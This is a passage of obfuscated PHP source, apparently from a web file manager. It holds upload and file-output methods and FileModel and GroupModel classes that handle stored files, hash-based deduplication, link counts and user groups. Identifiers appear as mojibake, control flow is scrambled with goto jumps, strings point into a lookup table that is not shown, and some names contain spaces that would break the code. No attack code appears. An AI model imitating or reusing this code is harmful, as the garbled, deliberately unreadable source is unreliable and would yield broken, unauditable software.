$A¯‚ßÙÈ£); } public function upload($AĞöÉ™³ÙÓ, $f±öÍê§×», $b³Ò¯áâ‘¬ = false, $c£³Äùäœ— = REPEAT_REPLACE) { $Cö´Ê³éÎ£ =& $_SERVER[©]; $b¨½ƒçïİ¢ = $this->parse($AĞöÉ™³ÙÓ); $e×È¢¨í«™ = $this->model->addFile($b¨½ƒçïİ¢[$Cö´Ê³éÎ£[375]], $f±öÍê§×», $b¨½ƒçïİ¢[$Cö´Ê³éÎ£[85]], $b³Ò¯áâ‘¬, $c£³Äùäœ—); return $this->getPathOuter($e×È¢¨í«™); } public function uploadFileByID($BÇ¿ŒÖÒÛº, $b²ù‚ÃÄ˜Â, $EÇ‰ªæ»‰×) { $d±Šêé†Ä² =& $_SERVER[©]; $A‘ã„Îõ´½ = $this->parse($BÇ¿ŒÖÒÛº); $aöŒÒˆ× = $this->model->addFileByFileID($A‘ã„Îõ´½[$d±Šêé†Ä²[375]], $b²ù‚ÃÄ˜Â, $A‘ã„Îõ´½[$d±Šêé†Ä²[85]], $EÇ‰ªæ»‰×); return $this->getPathOuter($aöŒÒˆ×); } public function addFileByRemote($C—Š½ê¯ª, $eÄøÑà‘Â², $cíë“”è = array(), $FÔ‹·Šñß = '', $c¹¸Ğ¥Š°”) { $dë³Ö×³Ô³ =& $_SERVER[©]; $Eéè•¯×²ˆ = $this->parse($C—Š½ê¯ª); $FÔ‹·Šñß = empty($FÔ‹·Šñß) ? $Eéè•¯×²ˆ[$dë³Ö×³Ô³[85]] : $FÔ‹·Šñß; $c‘½¦†Û„ğ = $this->model->addFileByRemote($Eéè•¯×²ˆ[$dë³Ö×³Ô³[375]], $eÄøÑà‘Â², $FÔ‹·Šñß, $cíë“”è, $c¹¸Ğ¥Š°”); return $this->getPathOuter($c‘½¦†Û„ğ); } public function uploadLink($D£“ºÇ™âï, $B—³Ø×•÷ï = 0) { $aÈŒĞ¢¯é =& $_SERVER[©]; $DŸ”¬ìÉÕ¿ = $this->parse($D£“ºÇ™âï); $D£“ºÇ™âï = Model($aÈŒĞ¢¯é[552])->createFileName($DŸ”¬ìÉÕ¿[$aÈŒĞ¢¯é[85]]); $FîîÉˆòÖ¢ = IO::uploadLink($D£“ºÇ™âï, $B—³Ø×•÷ï); return $FîîÉˆòÖ¢; } public function fileNameAuto($eñ“Œ·ºùİ, $Aî¨Ì´ì»ò, $EÅÊ¤‰Ş§Ê = REPEAT_REPLACE, $eÒƒÚ†ÒğÕ = false) { return $this->model->fileNameAuto($eñ“Œ·ºùİ, $Aî¨Ì´ì»ò, $EÅÊ¤‰Ş§Ê, $eÒƒÚ†ÒğÕ); } public function fileNameExist($A†©¥¯–Şï, $bÉºƒ·áÅ…) { return $this->model->fileNameExist($A†©¥¯–Şï, $bÉºƒ·áÅ…); } protected function _fileOut($BöÛ‹İ–¸, $cØÅèÜÛ¹ˆ = false, $Bô–íª‹š… = false, $eÊæ²ÒìŞŠ = '', $fôÇ¨Åâµ† = false) { goto fâ“ª« æ‚; fâ“ª« æ‚: $f°õª²“Å =& $_SERVER[©]; $c—êÑšƒ = $this->model->sourceInfo($BöÛ‹İ–¸); if ($c—êÑšƒ[$f°õª²“Å[378]] == $f°õª²“Å[93]) { header($f°õª²“Å[1117]); die; } goto A…Ãšƒ¢Î“; f”®œ‘‡µ: if ($fôÇ¨Åâµ†) { return IO::fileOutServer($eÇÁ‹ÙÇ•ˆ[$f°õª²“Å[85]], $cØÅèÜÛ¹ˆ, $eÆÒ’Ë¶ºİ, $eÊæ²ÒìŞŠ); } IO::fileOut($eÇÁ‹ÙÇ•ˆ[$f°õª²“Å[85]], $cØÅèÜÛ¹ˆ, $eÆÒ’Ë¶ºİ, $eÊæ²ÒìŞŠ); goto D¿±­îƒ¨Ø; A…Ãšƒ¢Î“: $eÇÁ‹ÙÇ•ˆ = $this->model->fileInfoGet($BöÛ‹İ–¸); $eÊæ²ÒìŞŠ = $eÇÁ‹ÙÇ•ˆ[$f°õª²“Å[173]] ? $eÇÁ‹ÙÇ•ˆ[$f°õª²“Å[173]] : $eÊæ²ÒìŞŠ; $eÆÒ’Ë¶ºİ = isset($GLOBALS[$f°õª²“Å[1118]]) ? $GLOBALS[$f°õª²“Å[1118]] : $c—êÑšƒ[$f°õª²“Å[38]]; goto f”®œ‘‡µ; D¿±­îƒ¨Ø: } public function fileOut($Déà”ÂïÅˆ, $fù¼¯™×ÊÀ = false, $aŠ˜ô‰Ëí… = false, $A¿õÒ´ŠÕø = '') { $this->_fileOut($Déà”ÂïÅˆ, $fù¼¯™×ÊÀ, $aŠ˜ô‰Ëí…, $A¿õÒ´ŠÕø); } public function fileOutServer($B†õ»äáÓ, $D¾ˆÖŠé¯ = false, $F´¾ ”°¯· = false, $f·Ø‰µŞ² = '') { $this->_fileOut($B†õ»äáÓ, $D¾ˆÖŠé¯, $F´¾ ”°¯·, $f·Ø‰µŞ², !0); } protected function _fileOutImage($eŠ­ËôÙƒ, $CĞÃ¸‹¿Áº = 250) { $A´’·äÎ£ =& $_SERVER[©]; $Fµ¼»Üè ‹ = $this->model->sourceInfo($eŠ­ËôÙƒ); if ($Fµ¼»Üè ‹[$A´’·äÎ£[378]] == $A´’·äÎ£[93]) { show_json($A´’·äÎ£[1119] . $eŠ­ËôÙƒ, !1); } $GLOBALS[$A´’·äÎ£[1118]] = $Fµ¼»Üè ‹[$A´’·äÎ£[38]]; $Aã‹Ü¯Ó• = $this->model->fileInfoGet($eŠ­ËôÙƒ); IO::fileOutImage($Aã‹Ü¯Ó•[$A´’·äÎ£[85]], $CĞÃ¸‹¿Áº); } public function fileOutImage($C¥åè‡Ù, $A‰±²„¾î± = 250) { $this->_fileOutImage($C¥åè‡Ù, $A‰±²„¾î±); } public function fileOutImageServer($fÔŸ…§°¼î, $C˜Û†»ŒÓ¹ = 250) { $this->_fileOutImage($fÔŸ…§°¼î, $C˜Û†»ŒÓ¹); } public function link($dÁ×ªÁÕí, $DÒ™Ğ®õÛŒ = '') { $CÊŠ»ÏÛ” = $this->model->fileInfoGet($dÁ×ªÁÕí); return IO::link($CÊŠ»ÏÛ”[$_SERVER[©][85]], $DÒ™Ğ®õÛŒ); } protected function parse($F®Õ÷­ˆ¯) { $Bˆ‡ó§å÷ =& $_SERVER[©]; if (strstr($F®Õ÷­ˆ¯, $Bˆ‡ó§å÷[18]) === !1) { return array($Bˆ‡ó§å÷[393] => intval($F®Õ÷­ˆ¯), $Bˆ‡ó§å÷[85] => $Bˆ‡ó§å÷[43], $Bˆ‡ó§å÷[1115] => array()); } $aÉ²  µç… = explode($Bˆ‡ó§å÷[18], trim($F®Õ÷­ˆ¯, $Bˆ‡ó§å÷[18])); if (count($aÉ²  µç…) < 2) { show_tips($F®Õ÷­ˆ¯ . $Bˆ‡ó§å÷[1120]); } return array($Bˆ‡ó§å÷[393] => intval($aÉ²  µç…[0]), $Bˆ‡ó§å÷[85] => $aÉ²  µç…[1], $Bˆ‡ó§å÷[1115] => array_slice($aÉ²  µç…, 1)); } } goto f£Ôö—›ˆÂ; añä‰›¬ğÏ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\145" => "\151\157\137\x66\x69\154\145\x5f\155\145\164\141", "\155\x65\x74\141\106\151\x65\x6c\x64" => "\146\x69\x6c\145\x49\104"); public function fileInfo($c†¯ãŸ„šè) { $e¦”âãÈâ´ =& $_SERVER[©]; static $fåÄ¸Å–Ñ = array(); if (!isset($fåÄ¸Å–Ñ[$c†¯ãŸ„šè])) { $f®ùÅ¤³†‰ = $e¦”âãÈâ´[2144]; $Dæ¾¡„–ÖÍ = Model($e¦”âãÈâ´[430])->field($f®ùÅ¤³†‰)->where(array($e¦”âãÈâ´[428] => $c†¯ãŸ„šè))->find(); $fåÄ¸Å–Ñ[$c†¯ãŸ„šè] = $Dæ¾¡„–ÖÍ; } return $fåÄ¸Å–Ñ[$c†¯ãŸ„šè]; } public function addFileByContent($b‚™«¸×Û“ = '', $cªĞ·ô” = '') { goto A˜Å«àß’Å; A˜Å«àß’Å: $aí…Ì¬å¶ =& $_SERVER[©]; $cøë®´ÁÎĞ = TEMP_PATH . $aí…Ì¬å¶[2145]; if (!is_dir($cøë®´ÁÎĞ)) { mk_dir($cøë®´ÁÎĞ); } goto e™ßöƒ©Ãó; e™ßöƒ©Ãó: $fÓ¬‚ÒŸØº = $cøë®´ÁÎĞ . $aí…Ì¬å¶[2146] . rand_string(16); file_put_contents($fÓ¬‚ÒŸØº, $b‚™«¸×Û“); $f—Ó¦ŒÇ¿é = $this->addFile($fÓ¬‚ÒŸØº, $cªĞ·ô”, !0); goto f£¡¢Êñ; f£¡¢Êñ: if (file_exists($fÓ¬‚ÒŸØº)) { @unlink($fÓ¬‚ÒŸØº); } return $f—Ó¦ŒÇ¿é; goto f™¼‘–‹È; f™¼‘–‹È: } public function createFileName($eŠÑ·áÊŞé) { goto eø¼”Ó¹; f÷éé°¨£ª: $AõÚõó¹Œ• = $A”ëóÊ‰³->pathFather($C”¦„èÎÀ˜); static $A‡Üèª›…¦ = false; $A¯ì›ê×ùğ = $d”Ø½§—¶õ[2147] . md5($AõÚõó¹Œ•); goto DË–µ«÷²°; DË–µ«÷²°: if (!$A‡Üèª›…¦ && !Cache::get($A¯ì›ê×ùğ)) { $A‡Üèª›…¦ = !0; $b–Àßøïäó = IO::mkdir($AõÚõó¹Œ•); if (!IO::exist($b–Àßøïäó . $d”Ø½§—¶õ[2148])) { IO::mkfile($b–Àßøïäó . $d”Ø½§—¶õ[2148]); } Cache::set($A¯ì›ê×ùğ, 1, 3600 * 2); } return $C”¦„èÎÀ˜; goto D£¥®ÙÎÂ·; eø¼”Ó¹: $d”Ø½§—¶õ =& $_SERVER[©]; $A”ëóÊ‰³ = IO::init($d”Ø½§—¶õ[18]); $C”¦„èÎÀ˜ = $this->makeFilePath($eŠÑ·áÊŞé, $A”ëóÊ‰³); goto f÷éé°¨£ª; D£¥®ÙÎÂ·: } public function makeFilePath($EË…†›ğ”à, $A¸Á¡ÖĞÀ) { goto b‘ˆÉÙ‚Û…; bˆã›äÀó²: $fò¼ĞÁİó = $c¤£Ëé¨¾ . rand_string(5) . short_id(100); $EË…†›ğ”à = str_replace($BĞ¥¶ôŒÎÂ[18], $BĞ¥¶ôŒÎÂ[80], KodIO::clear($EË…†›ğ”à)); if (!$EË…†›ğ”à) { $A‰¾•Ğâç = $BĞ¥¶ôŒÎÂ[2151]; } goto bŒ•©İª’; bŒ•©İª’: switch ($A‰¾•Ğâç) { case $BĞ¥¶ôŒÎÂ[2152]: $fò¼ĞÁİó = $fò¼ĞÁİó . $BĞ¥¶ôŒÎÂ[101] . $A¸Á¡ÖĞÀ->ext($EË…†›ğ”à); if ($A¸Á¡ÖĞÀ->ext($EË…†›ğ”à) == $BĞ¥¶ôŒÎÂ[2092]) { $fò¼ĞÁİó .= $BĞ¥¶ôŒÎÂ[2153]; } break; case $BĞ¥¶ôŒÎÂ[2154]: goto cÆ©£”ê¥¸; DÂ»¶Á•¾š: if ($A¸Á¡ÖĞÀ->ext($EË…†›ğ”à) == $BĞ¥¶ôŒÎÂ[2092]) { $EË…†›ğ”à .= $BĞ¥¶ôŒÎÂ[2153]; } $A˜ïÃ–Şã = IO::fileNameAuto($c¤£Ëé¨¾, $EË…†›ğ”à); $fò¼ĞÁİó = $c¤£Ëé¨¾ . $A˜ïÃ–Şã; goto bó»°¯Òëô; bó»°¯Òëô: break; goto cÓ÷÷ÒÊ·ˆ; cÆ©£”ê¥¸: $F˜‚ÉôÊœË = Model($BĞ¥¶ôŒÎÂ[1085])->get($BĞ¥¶ôŒÎÂ[1331]); $fõ¼¢†Ó“ç = substr(md5($BĞ¥¶ôŒÎÂ[1911] . $F˜‚ÉôÊœË . date($BĞ¥¶ôŒÎÂ[686])), 0, 8); $c¤£Ëé¨¾ = KodIO::defaultIO() . date($BĞ¥¶ôŒÎÂ[2155]) . $fõ¼¢†Ó“ç . $BĞ¥¶ôŒÎÂ[18]; goto DÂ»¶Á•¾š; cÓ÷÷ÒÊ·ˆ: case $BĞ¥¶ôŒÎÂ[2151]: break; default: break; } return $fò¼ĞÁİó; goto eÇ›•äæ×¤; b‘ˆÉÙ‚Û…: $BĞ¥¶ôŒÎÂ =& $_SERVER[©]; $A‰¾•Ğâç = Model($BĞ¥¶ôŒÎÂ[1085])->get($BĞ¥¶ôŒÎÂ[2149]); $c¤£Ëé¨¾ = KodIO::defaultIO() . date($BĞ¥¶ôŒÎÂ[2150]); goto bˆã›äÀó²; eÇ›•äæ×¤: } public function addFileByRemote($F ³íôÆˆ, $b²µĞ‘š„­, $AÈ âƒ²ï‹ = array()) { goto BÌ‚©àŒ»½; aÊ›µÃ›«ä: if ($aÆ¿ùè¿î¸ = $this->addFileCheckExist($CŠƒÍ®Á®“[$AëÛõÂ¿™¾[174]], $CŠƒÍ®Á®“[$AëÛõÂ¿™¾[173]], $CŠƒÍ®Á®“[$AëÛõÂ¿™¾[87]])) { return $aÆ¿ùè¿î¸; } return $this->addFileData($CŠƒÍ®Á®“); goto aòÍ½©ªß ; Bµ äĞãÁ’: $aŒìÙÔ†à¨ = IO::hashMd5($F ³íôÆˆ, $F¾ŒÒøä¢); $cŞ‚ååÍÒ = KodIO::defaultDriver(); $CŠƒÍ®Á®“ = array($AëÛõÂ¿™¾[528] => IO::size($F ³íôÆˆ), $AëÛõÂ¿™¾[2156] => 1, $AëÛõÂ¿™¾[394] => $b²µĞ‘š„­, $AëÛõÂ¿™¾[735] => $cŞ‚ååÍÒ[$AëÛõÂ¿™¾[375]], $AëÛõÂ¿™¾[395] => $F ³íôÆˆ, $AëÛõÂ¿™¾[2157] => $AÈ âƒ²ï‹[$AëÛõÂ¿™¾[174]] ? $AÈ âƒ²ï‹[$AëÛõÂ¿™¾[174]] : IO::hashSimple($F ³íôÆˆ), $AëÛõÂ¿™¾[2158] => $aŒìÙÔ†à¨ ? $aŒìÙÔ†à¨ : $F¾ŒÒøä¢); goto aÊ›µÃ›«ä; BÌ‚©àŒ»½: $AëÛõÂ¿™¾ =& $_SERVER[©]; if (!IO::exist($F ³íôÆˆ)) { return !1; } $F¾ŒÒøä¢ = $AÈ âƒ²ï‹[$AëÛõÂ¿™¾[173]] ? $AÈ âƒ²ï‹[$AëÛõÂ¿™¾[173]] : $AëÛõÂ¿™¾[43]; goto Bµ äĞãÁ’; aòÍ½©ªß : } private function addFileData($fœ ‚¬äãÖ) { $däÜªÇ¤«Ö =& $_SERVER[©]; if (!$fœ ‚¬äãÖ) { return !1; } $fœ ‚¬äãÖ[$däÜªÇ¤«Ö[87]] = intval($fœ ‚¬äãÖ[$däÜªÇ¤«Ö[87]]); if (!$fœ ‚¬äãÖ[$däÜªÇ¤«Ö[87]] && strlen($fœ ‚¬äãÖ[$däÜªÇ¤«Ö[174]]) > 32) { $fœ ‚¬äãÖ[$däÜªÇ¤«Ö[87]] = intval(substr($fœ ‚¬äãÖ[$däÜªÇ¤«Ö[174]], 32)); } $dŞëì¦¢´ = $this->add($fœ ‚¬äãÖ); return $this->find($dŞëì¦¢´); } public function addFile($f‰ôë‘¼Ğ, $aòİêö…¹ , $b×µÇ‡—óÊ = false) { $bÖËòŠè° = IO::hashSimple($f‰ôë‘¼Ğ); $càÉáˆáğğ = IO::hashMd5($f‰ôë‘¼Ğ); $FÏÛóĞ‹ã® = IO::size($f‰ôë‘¼Ğ); if ($b–Ê‰¦¬Ô¶ = $this->addFileCheckExist($bÖËòŠè°, $càÉáˆáğğ, $FÏÛóĞ‹ã®)) { return $b–Ê‰¦¬Ô¶; } $A¸Ò±™ß°Ø = $this->addFileMake($f‰ôë‘¼Ğ, $FÏÛóĞ‹ã®, $bÖËòŠè°, $càÉáˆáğğ, $aòİêö…¹ , $b×µÇ‡—óÊ); return $this->addFileData($A¸Ò±™ß°Ø); } public function addFileMake($F±¼ë¹ƒ÷ƒ, $BÁÜ¦æ›‘ˆ, $EÕƒÛÁ™éï, $aÉœæ›åÜ, $Bˆàñ¢‚ˆ¼, $e˜š±æÚ¼ª) { goto dÛ°™óÆ„à; B…××ìæÏ¦: $FÆ°®­å—ó = get_path_this($BìÙ„îâ‡…); if ($e˜š±æÚ¼ª) { $f½İòƒ–×† = IO::move($F±¼ë¹ƒ÷ƒ, $a™–æë‘’¾, !1, $FÆ°®­å—ó); } else { $f½İòƒ–×† = IO::copy($F±¼ë¹ƒ÷ƒ, $a™–æë‘’¾, !1, $FÆ°®­å—ó); } if (!$f½İòƒ–×†) { return !1; } goto fŠÆå„Î„¿; dÛ°™óÆ„à: $AñÉËò—ë‹ =& $_SERVER[©]; $BìÙ„îâ‡… = $this->createFileName($Bˆàñ¢‚ˆ¼); $a™–æë‘’¾ = get_path_father($BìÙ„îâ‡…); goto B…××ìæÏ¦; fŠÆå„Î„¿: $f“Ù°±©”– = KodIO::defaultDriver(); $a²‹¼ïßŞ” = array($AñÉËò—ë‹[528] => $BÁÜ¦æ›‘ˆ, $AñÉËò—ë‹[2156] => 1, $AñÉËò—ë‹[394] => $Bˆàñ¢‚ˆ¼, $AñÉËò—ë‹[735] => $f“Ù°±©”–[$AñÉËò—ë‹[375]], $AñÉËò—ë‹[395] => $BìÙ„îâ‡…, $AñÉËò—ë‹[2157] => $EÕƒÛÁ™éï, $AñÉËò—ë‹[2158] => $aÉœæ›åÜ); return $a²‹¼ïßŞ”; goto eº–«ìóÏ‘; eº–«ìóÏ‘: } public function addFileCheckExist($b‡ó½ŒŞ ‚, $B‰âõ”‹ñ–, $cš¹Œ¯¾Úã) { $A®•¹Öòì =& $_SERVER[©]; $Bİà…õâØà = $this->findByHash($b‡ó½ŒŞ ‚, $B‰âõ”‹ñ–); if (!$Bİà…õâØà) { return !1; } $f¯ĞÕª ‰‚ = array($A®•¹Öòì[2156] => intval($Bİà…õâØà[$A®•¹Öòì[2159]]) + 1, $A®•¹Öòì[528] => $cš¹Œ¯¾Úã); $this->where(array($A®•¹Öòì[428] => $Bİà…õâØà[$A®•¹Öòì[427]]))->save($f¯ĞÕª ‰‚); return $Bİà…õâØà; } public function remove($f»ÆŠ†÷©†) { $this->linkCountChange($f»ÆŠ†÷©†, !1); $this->clearEmpty(); return !0; } public function linkAdd($AÈ÷ğºŒÊ§) { $this->linkCountChange($AÈ÷ğºŒÊ§, !0); } public function linkCountChange($CßÌñËÜ¼¦, $e¤Œ”†æ) { goto a™ÓÒøí£Ñ; a™ÓÒøí£Ñ: $dª£Ñ„ÃÚó =& $_SERVER[©]; if (!$CßÌñËÜ¼¦) { return; } if (!is_array($CßÌñËÜ¼¦)) { $CßÌñËÜ¼¦ = array($CßÌñËÜ¼¦); } goto Fù¡Á²¼‘; b‡óå­µ¢İ: foreach ($A‰µã…–Ú as $A±–¬õ Ä => $B¹°ôÈ•ùà) { $c¡¼î“Ë™ = $B¹°ôÈ•ùà . $dª£Ñ„ÃÚó[43]; if (!$BÇÙº¶ô[$c¡¼î“Ë™]) { $BÇÙº¶ô[$c¡¼î“Ë™] = array(); } $BÇÙº¶ô[$c¡¼î“Ë™][] = $A±–¬õ Ä; } foreach ($BÇÙº¶ô as $B¹°ôÈ•ùà => $aòÙ›æ”º) { if (!$aòÙ›æ”º) { continue; } $B¹°ôÈ•ùà = $e¤Œ”†æ ? $B¹°ôÈ•ùà : -intval($B¹°ôÈ•ùà); $B¼ö¿¡“ˆ¢ = array($dª£Ñ„ÃÚó[427] => array($dª£Ñ„ÃÚó[17], $aòÙ›æ”º)); if ($B¹°ôÈ•ùà < 0) { $B¼ö¿¡“ˆ¢[$dª£Ñ„ÃÚó[2159]] = array($dª£Ñ„ÃÚó[926], abs($B¹°ôÈ•ùà)); } $this->where($B¼ö¿¡“ˆ¢)->setAdd($dª£Ñ„ÃÚó[2159], $B¹°ôÈ•ùà); } goto bÔÂÁÖóöñ; Fù¡Á²¼‘: $A‰µã…–Ú = array(); foreach ($CßÌñËÜ¼¦ as $A±–¬õ Ä) { $c¡¼î“Ë™ = $A±–¬õ Ä . $dª£Ñ„ÃÚó[43]; if (!$A‰µã…–Ú[$c¡¼î“Ë™]) { $A‰µã…–Ú[$c¡¼î“Ë™] = 0; } $A‰µã…–Ú[$c¡¼î“Ë™]++; } $BÇÙº¶ô = array(); goto b‡óå­µ¢İ; bÔÂÁÖóöñ: } public function findByHash($e®ˆÈªŒ˜¡, $AÆñĞ½®×„ = false) { $bœª“ÆÃ†Ã =& $_SERVER[©]; if (!$e®ˆÈªŒ˜¡ && !$AÆñĞ½®×„) { return !1; } $FÜê³¯‹› = array($bœª“ÆÃ†Ã[2157] => $e®ˆÈªŒ˜¡); if ($AÆñĞ½®×„) { $FÜê³¯‹› = array($bœª“ÆÃ†Ã[2158] => $AÆñĞ½®×„); } return $this->order($bœª“ÆÃ†Ã[2160])->where($FÜê³¯‹›)->find(); } public function clearEmpty($Bœ‚š´Ö‘Ì = 0) { goto FÇäÇ£”’“; f‹ô«³Œø: $a÷ÃÎÆäê = $this->where($f²æèª³Ï)->select(); if (!$a÷ÃÎÆäê) { return; } $A”áÖ¨…ù = new Task($C’Ì–Œ—ªÜ[2162], $C’Ì–Œ—ªÜ[43], count($a÷ÃÎÆäê)); goto D§®²íÆíç; FÇäÇ£”’“: $C’Ì–Œ—ªÜ =& $_SERVER[©]; $Fä‡ªÜ³áÚ = time() - 3600 * 24 * $Bœ‚š´Ö‘Ì; $f²æèª³Ï = $C’Ì–Œ—ªÜ[2161] . $Fä‡ªÜ³áÚ; goto f‹ô«³Œø; D§®²íÆíç: foreach ($a÷ÃÎÆäê as $e§„™¹ŠŒ³) { $A”áÖ¨…ù->update(1); $this->resetFile($e§„™¹ŠŒ³); } $A”áÖ¨…ù->end(); goto CÃ×“·ìŒæ; CÃ×“·ìŒæ: } private function resetFile($aøå«—“˜Ã) { goto bÓº‰™¼½; E‰†©²®É: $D´Ú‹Í“ŞÉ = Model($D¢ÑŠ´æ«[2163])->where($b‘Ë§ºäİ)->count(); $B•ªÓ„¶İ­ = intval($DÈÊŸ¦ï¡) + intval($D´Ú‹Í“ŞÉ); if ($B•ªÓ„¶İ­ == 0) { IO::remove($aøå«—“˜Ã[$D¢ÑŠ´æ«[85]]); $this->where($b‘Ë§ºäİ)->delete(); $this->metaSet($aøå«—“˜Ã[$D¢ÑŠ´æ«[427]], null, null); return; } goto A„ì°Ã©ö; bÓº‰™¼½: $D¢ÑŠ´æ« =& $_SERVER[©]; $b‘Ë§ºäİ = array($D¢ÑŠ´æ«[428] => $aøå«—“˜Ã[$D¢ÑŠ´æ«[427]]); $DÈÊŸ¦ï¡ = Model($D¢ÑŠ´æ«[1114])->where($b‘Ë§ºäİ)->count(); goto E‰†©²®É; A„ì°Ã©ö: if ($aøå«—“˜Ã[$D¢ÑŠ´æ«[2159]] != $B•ªÓ„¶İ­) { $this->where($b‘Ë§ºäİ)->save(array($D¢ÑŠ´æ«[2156] => $B•ªÓ„¶İ­)); } goto E¤¦‘‘­Â; E¤¦‘‘­Â: } public function storageInfo($A„í³ƒ = false) { goto d˜ï‚ó§œÅ; Cí»±¾ßØ: $e”ŠÂÛ¨˜— = 1; $F×ê¿ìë˜Ë = 0; $d“ÉíÄÇ“ = 5000; goto D¡‹óéİ°; d˜ï‚ó§œÅ: $e‰çŞÚ‘· =& $_SERVER[©]; $A±ª°’µÍ = $this->count() + 0.0; $d¨‹ß´¦ìè = 0; goto Cí»±¾ßØ; D¡‹óéİ°: for ($BŠ ëÜ¯¹Ì = 0; $BŠ ëÜ¯¹Ì < $A±ª°’µÍ; $BŠ ëÜ¯¹Ì = $BŠ ëÜ¯¹Ì + $d“ÉíÄÇ“) { $dÈº“®† = $this->limit($BŠ ëÜ¯¹Ì, $BŠ ëÜ¯¹Ì + $d“ÉíÄÇ“)->select(); foreach ($dÈº“®† as $EøÆã¿Ïó§) { $e”ŠÂÛ¨˜— += $EøÆã¿Ïó§[$e‰çŞÚ‘·[87]] * $EøÆã¿Ïó§[$e‰çŞÚ‘·[2159]]; $d¨‹ß´¦ìè += $EøÆã¿Ïó§[$e‰çŞÚ‘·[87]] * ($EøÆã¿Ïó§[$e‰çŞÚ‘·[2159]] - 1); $F×ê¿ìë˜Ë += $EøÆã¿Ïó§[$e‰çŞÚ‘·[2159]]; } } $b ·™öìĞ¸ = array($e‰çŞÚ‘·[2164] => $e”ŠÂÛ¨˜—, $e‰çŞÚ‘·[2165] => $d¨‹ß´¦ìè, $e‰çŞÚ‘·[2166] => $d¨‹ß´¦ìè / $e”ŠÂÛ¨˜—, $e‰çŞÚ‘·[91] => $A±ª°’µÍ, $e‰çŞÚ‘·[2167] => $F×ê¿ìë˜Ë); return $b ·™öìĞ¸; goto CÂö‚—»‡; CÂö‚—»‡: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\145" => "\x67\162\157\165\x70\x5f\x6d\145\x74\x61", "\155\145\164\x61\x46\x69\145\154\x64" => "\x67\162\157\x75\160\x49\104"); protected function cacheFunctionAlias($dÄ»‹‘·¦‡) { $fŒ±ïóîëÉ =& $_SERVER[©]; return array($fŒ±ïóîëÉ[2168] => array($dÄ»‹‘·¦‡[0], $fŒ±ïóîëÉ[2169]), $fŒ±ïóîëÉ[2170] => array($dÄ»‹‘·¦‡[0], $fŒ±ïóîëÉ[2169])); } protected function getInfo($Dñ¸äœ®) { $e´šÛ¦‘óê = $this->getInfoSimple($Dñ¸äœ®); if (!$e´šÛ¦‘óê) { return !1; } return $this->_listDataApplyItem($e´šÛ¦‘óê); } protected function getInfoSimple($CŸİ°ºË˜×, $BçŠ‡ùèÁÙ = false) { $E¿ßÜ«øÜÊ =& $_SERVER[©]; if ($BçŠ‡ùèÁÙ) { $C•Û°ÄŒËÑ = array($E¿ßÜ«øÜÊ[2102] => intval($CŸİ°ºË˜×)); $Aá»£Ğ§Ğ = $this->where($C•Û°ÄŒËÑ)->find(); return is_array($Aá»£Ğ§Ğ) ? $Aá»£Ğ§Ğ : array(); } return $this->cacheFunctionGet($E¿ßÜ«øÜÊ[2171], $CŸİ°ºË˜×); } protected function groupAdd($c‘ßëà•‡î) { goto BŒË¦˜Ôƒ; c³…³‹Ï×¸: if (!empty($c‘ßëà•‡î[$AÌ–¾áÏõ[2102]])) { $A¾é¹ßÎ[$AÌ–¾áÏõ[2102]] = $c‘ßëà•‡î[$AÌ–¾áÏõ[2102]]; } $D’Ğ¥­Ì = $this->add($A¾é¹ßÎ); $this->setNamePinyin($D’Ğ¥­Ì, $A¾é¹ßÎ[$AÌ–¾áÏõ[38]]); goto bĞîÙÓ•šÇ; bĞîÙÓ•šÇ: if (isset($c‘ßëà•‡î[$AÌ–¾áÏõ[2174]])) { $this->metaSet($D’Ğ¥­Ì, array($AÌ–¾áÏõ[2174] => $c‘ßëà•‡î[$AÌ–¾áÏõ[2174]], $AÌ–¾áÏõ[2175] => $c‘ßëà•‡î[$AÌ–¾áÏõ[2175]])); unset($c‘ßëà•‡î[$AÌ–¾áÏõ[2174]]); unset($c‘ßëà•‡î[$AÌ–¾áÏõ[2175]]); } Model($AÌ–¾áÏõ[1114])->groupRootAdd($D’Ğ¥­Ì); return $D’Ğ¥­Ì; goto fƒÍñÆÁî©; BŒË¦˜Ôƒ: $AÌ–¾áÏõ =& $_SERVER[©]; if (!$c‘ßëà•‡î[$AÌ–¾áÏõ[469]] && isset($c‘ßëà•‡î[$AÌ–¾áÏõ[2102]]) && $c‘ßëà•‡î[$AÌ–¾áÏõ[2102]] == 1) { if ($Dèåó¶š = $this->getInfoSimple($c‘ßëà•‡î[$AÌ–¾áÏõ[2102]], !0)) { return $c‘ßëà•‡î[$AÌ–¾áÏõ[2102]]; } } else { $Dèåó¶š = $this->getInfoSimple($c‘ßëà•‡î[$AÌ–¾áÏõ[469]]); if (!$Dèåó¶š) { return !1; } } $câ¨³¬ë½ = $AÌ–¾áÏõ[478]; goto C‡È«Ê§ŒÏ; C‡È«Ê§ŒÏ: if ($Dèåó¶š[$AÌ–¾áÏõ[467]]) { $câ¨³¬ë½ = $Dèåó¶š[$AÌ–¾áÏõ[467]] . $Dèåó¶š[$AÌ–¾áÏõ[2102]] . $AÌ–¾áÏõ[57]; } $A¾é¹ßÎ = array($AÌ–¾áÏõ[394] => $this->groupNameAuto($c‘ßëà•‡î[$AÌ–¾áÏõ[469]], $c‘ßëà•‡î[$AÌ–¾áÏõ[38]]), $AÌ–¾áÏõ[376] => $c‘ßëà•‡î[$AÌ–¾áÏõ[469]], $AÌ–¾áÏõ[533] => $câ¨³¬ë½, $AÌ–¾áÏõ[2172] => $c‘ßëà•‡î[$AÌ–¾áÏõ[2086]], $AÌ–¾áÏõ[2173] => 0, $AÌ–¾áÏõ[2106] => 0); if (isset($c‘ßëà•‡î[$AÌ–¾áÏõ[2123]])) { $A¾é¹ßÎ[$AÌ–¾áÏõ[2123]] = $c‘ßëà•‡î[$AÌ–¾áÏõ[2123]]; } else { $Cµ®’¦é‘ = $this->max($AÌ–¾áÏõ[2123]); if (!$Cµ®’¦é‘) { $Cµ®’¦é‘ = 0; } $A¾é¹ßÎ[$AÌ–¾áÏõ[2123]] = $Cµ®’¦é‘ + 1; } goto c³…³‹Ï×¸; fƒÍñÆÁî©: } protected function groupEdit($cÚé³•ÑÊ„, $f¨­Ã‹øÉ£) { $FîÙ¯·  =& $_SERVER[©]; if (!empty($f¨­Ã‹øÉ£[$FîÙ¯· [469]])) { $A”±Õ¨÷„Œ = $this->getInfoSimple($cÚé³•ÑÊ„); $d¶‡ºõÆƒ = 